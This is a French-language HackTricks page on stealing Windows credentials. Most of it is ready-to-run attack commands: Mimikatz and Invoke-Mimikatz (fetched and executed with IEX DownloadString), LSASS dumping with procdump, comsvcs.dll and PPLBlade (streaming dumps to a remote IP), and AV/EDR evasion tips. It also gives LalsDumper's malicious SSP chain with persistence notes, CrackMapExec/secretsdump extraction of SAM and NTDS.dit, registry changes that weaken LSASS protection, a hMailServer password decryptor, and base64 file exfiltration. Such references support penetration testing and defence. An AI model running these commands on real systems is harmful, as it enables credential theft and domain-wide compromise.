# Vol de Credentials Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire dans** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**En savoir plus sur certaines protections possibles des credentials ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains credentials.**

## Credentials avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des passwords et des hashes** dans la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contourner l'AV

### Procdump + Mimikatz

Comme **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dump the lsass process**, **download the dump** et **extract** les **credentials locally** depuis le dump.

Vous pouvez aussi utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note** : Certains **AV** peuvent **détecter** comme **malicieuse** l'utilisation de **procdump.exe to dump lsass.exe**, ceci parce qu'ils détectent la chaîne **"procdump.exe" and "lsass.exe"**. Il est donc plus **discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu** du **nom lsass.exe.**

### Dump de lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll** située dans `C:\Windows\System32` est responsable de la création d'un dump de la mémoire des processus en cas de crash. Cette DLL contient une **fonction** nommée **`MiniDumpW`**, prévue pour être invoquée via `rundll32.exe`.\
Les deux premiers arguments n'ont pas d'importance, mais le troisième se divise en trois composants. Le PID du processus à dumper constitue le premier composant, l'emplacement du fichier de dump représente le deuxième, et le troisième composant est strictement le mot **full**. Aucune autre option n'existe.\
Après analyse de ces trois composants, la DLL crée le fichier de dump et y transfère la mémoire du processus spécifié.\
L'utilisation de la **comsvcs.dll** permet de dumper le processus lsass, évitant ainsi d'uploader et d'exécuter procdump. Cette méthode est décrite en détail à [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

La commande suivante est utilisée pour l'exécution :
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump de lsass avec Task Manager**

1. Faites un clic droit sur la barre des tâches et cliquez sur Task Manager
2. Cliquez sur More details
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processes
4. Faites un clic droit sur le processus "Local Security Authority Process" et cliquez sur "Create dump file".

### Dump de lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping de lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un Protected Process Dumper Tool qui prend en charge l'obfuscation des memory dump et leur transfert vers des postes distants sans les déposer sur le disque.

**Principales fonctionnalités**:

1. Contournement de la protection PPL
2. Obfuscation des fichiers memory dump pour échapper aux mécanismes de détection basés sur des signatures de Defender
3. Téléversement des memory dump via les méthodes RAW et SMB sans les déposer sur le disque (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dump LSASS basé sur SSP sans MiniDumpWriteDump

Ink Dragon fournit un dumper en trois étapes nommé **LalsDumper** qui n'appelle jamais `MiniDumpWriteDump`, donc les EDR hooks sur cette API ne se déclenchent jamais :

1. **Stage 1 loader (`lals.exe`)** – cherche dans `fdp.dll` un placeholder constitué de 32 caractères `d` minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre le DLL patché sous `nfdp.dll`, et appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger le DLL malveillant comme un nouveau Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quand LSASS charge `nfdp.dll`, le DLL lit `rtu.txt`, effectue un XOR de chaque octet avec `0x20`, et mappe le blob décodé en mémoire avant de transférer l'exécution.
3. **Stage 3 dumper** – le payload mappé réimplémente la logique MiniDump en utilisant des direct syscalls résolus à partir de noms d'API hashés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle pour permettre l'exfiltration ultérieure.

Notes pour l'opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll`, et `rtu.txt` dans le même répertoire. Stage 1 réécrit le placeholder codé en dur avec le chemin absolu vers `rtu.txt`, donc les séparer casse la chaîne.
* L'enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez initialiser cette valeur vous-même pour forcer LSASS à recharger le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez localement, puis passez-les à Mimikatz/Volatility pour l'extraction des identifiants.
* Lancer `lals.exe` nécessite des droits admin/SeTcb pour que `AddSecurityPackageA` réussisse ; une fois l'appel revenu, LSASS charge de façon transparente le SSP malveillant et exécute Stage 2.
* Supprimer le DLL du disque ne l'évince pas de LSASS. Supprimez l'entrée de registre et redémarrez LSASS (reboot) ou laissez-le pour une persistance à long terme.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump le NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe de NTDS.dit à partir du target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Voler SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM_. Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### Depuis le registre

La façon la plus simple de récupérer ces fichiers est d'obtenir une copie depuis le registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez copier des fichiers protégés en utilisant ce service. Vous devez être Administrator.

#### Utilisation de vssadmin

Le binaire vssadmin n'est disponible que dans les versions Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le SAM file** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public) mais vous pouvez l'utiliser pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code extrait du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Le **NTDS.dit** file est connu comme le cœur d'**Active Directory**, contenant des données cruciales sur les objets utilisateur, les groupes et leurs appartenances. C'est là que sont stockés les **password hashes** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Data Table** : Cette table est chargée de stocker les détails des objets comme les utilisateurs et les groupes.
- **Link Table** : Elle suit les relations, comme les appartenances à des groupes.
- **SD Table** : Les **descripteurs de sécurité** pour chaque objet sont conservés ici, assurant la sécurité et le contrôle d'accès des objets stockés.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. De plus, une **partie** du fichier **NTDS.dit** peut se trouver **inside the `lsass`** memory (vous pouvez y trouver les données récemment accédées, probablement en raison d'une amélioration des performances via un **cache**).

#### Décrypting the hashes inside NTDS.dit

Le hash est chiffré 3 fois :

1. Déchiffrer le Password Encryption Key (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Déchiffrer le hash en utilisant **PEK** et **RC4**.
3. Déchiffrer le hash en utilisant **DES**.

Le **PEK** a la même valeur sur chaque contrôleur de domaine, mais il est chiffré à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du fichier **SYSTEM** du contrôleur de domaine (qui est différent entre les contrôleurs de domaine). C'est pourquoi, pour obtenir les credentials depuis le fichier NTDS.dit, vous avez besoin des fichiers **NTDS.dit** et **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez aussi utiliser l'astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) astuce).

### **Extracting hashes from NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez aussi **les extraire automatiquement** en utilisant un utilisateur domain admin valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit**, il est recommandé de les extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **metasploit module** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base SQLite**

Les objets NTDS peuvent être extraits vers une base SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et de leurs attributs pour permettre une extraction d'informations plus approfondie une fois que le fichier NTDS.dit brut a été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La ruche `SYSTEM` est optionnelle mais permet le déchiffrement des secrets (NT & LM hashes, supplemental credentials telles que cleartext passwords, kerberos ou trust keys, NT & LM password histories). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, UAC flags, timestamp du dernier logon et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et memberships récursifs, arbre des organizational units et membership, trusted domains avec le type, la direction et les attributs des trusts...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binary pour extraire des credentials depuis plusieurs software.
```
lazagne.exe all
```
## Autres outils pour extraire des credentials de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des credentials de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrait des credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** simplement, les mots de passe seront extraits.

## Extraction des sessions RDP inactives et affaiblissement des contrôles de sécurité

Le RAT FinalDraft d'Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :

### Collecte de télémétrie de type DumpRDPHistory

* **Cibles RDP sortantes** – analyser chaque ruche utilisateur dans `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint`, et le timestamp de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Preuves RDP entrantes** – interroger le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les Event IDs **21** (connexion réussie) et **25** (déconnexion) afin de cartographier qui a administré la machine :

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. CredSSP + NTLM fallback laisse leur vérificateur et leurs jetons dans LSASS, qui peuvent ensuite être rejoués sur SMB/WinRM pour récupérer `NTDS.dit` ou installer une persistance sur les contrôleurs de domaine.

### Déclassements du registre ciblés par FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Le paramètre `DisableRestrictedAdmin=1` force la réutilisation complète des identifiants/billets lors de RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des tokens UAC, de sorte que les administrateurs locaux obtiennent des tokens sans restriction sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter pendant que le DC est en ligne, offrant aux attaquants un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l'accès mémoire trivial pour les dumpers tels que LalsDumper.

## Identifiants de la base de données hMailServer (après compromission)

hMailServer stocke son mot de passe DB dans `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sous `[Database] Password=`. La valeur est chiffrée avec Blowfish en utilisant la clé statique `THIS_KEY_IS_NOT_SECRET` et des inversions de l'ordre des octets sur des mots de 4 octets. Utilisez la chaîne hexadécimale depuis l'INI avec ce snippet Python :
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrous de fichiers, chargez le provider 32-bit, et mettez à niveau si nécessaire avant d'interroger les hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonne `accountpassword` utilise le format de hash hMailServer (mode hashcat `1421`). Le craquage de ces valeurs peut fournir des identifiants réutilisables pour des pivots WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Certains outils capturent les **plaintext logon passwords** en interceptant le callback de logon LSA `LsaApLogonUserEx2`. Le principe consiste à hooker ou envelopper le callback du package d'authentification afin que les identifiants soient capturés **pendant le logon** (avant le hachage), puis écrits sur le disque ou renvoyés à l'opérateur. Ceci est couramment implémenté via un helper qui s'injecte dans, ou s'enregistre auprès de, LSA, puis enregistre chaque événement d'ouverture de session interactive/réseau réussi avec le nom d'utilisateur, le domaine et le mot de passe.

Operational notes:
- Nécessite les privilèges d'administrateur local / SYSTEM pour charger le helper dans le chemin d'authentification.
- Les identifiants capturés n'apparaissent que lorsqu'une ouverture de session a lieu (interactive, RDP, service, ou ouverture de session réseau selon le hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stocke les informations de connexion sauvegardées dans un fichier par-utilisateur `sqlstudio.bin`. Des dumpers dédiés peuvent analyser le fichier et récupérer les identifiants SQL sauvegardés. Dans des shells qui ne renvoient que la sortie de commande, le fichier est souvent exfiltré en l'encodant en Base64 et en l'affichant sur stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Du côté de l'opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Références

- [Unit 42 – Une enquête sur des années d'opérations non détectées visant des secteurs de grande valeur](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon – Révélation du réseau de relais et du fonctionnement interne d'une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
